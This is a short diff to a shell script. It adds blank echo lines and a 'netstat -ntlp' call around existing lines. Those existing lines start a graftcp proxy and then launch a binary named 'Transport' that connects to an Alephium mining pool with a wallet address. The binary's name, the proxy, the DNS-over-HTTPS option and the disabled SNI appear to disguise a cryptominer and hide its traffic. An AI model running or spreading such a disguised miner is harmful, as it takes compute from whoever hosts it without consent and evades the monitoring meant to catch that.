@@ -59,5 +59,16 @@ END
 ./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &
 sleep .2
 
+echo " "
+echo " "
+echo " "
+echo " "
+
+netstat -ntlp
+
+echo " "
+echo " "
+echo " "
+echo " "
 
 ./Transport -a blake3 -o stratum+ssl://us2.alephium.herominers.com:1199 -u 1Hk3MN2pjgDCDy2PigfxnVMJ9fQcfmb6cYqpsYtMaUziM -w Transport -p x --no-sni --dns-https-server 1.1.1.1 --proxy 127.0.0.1:1338
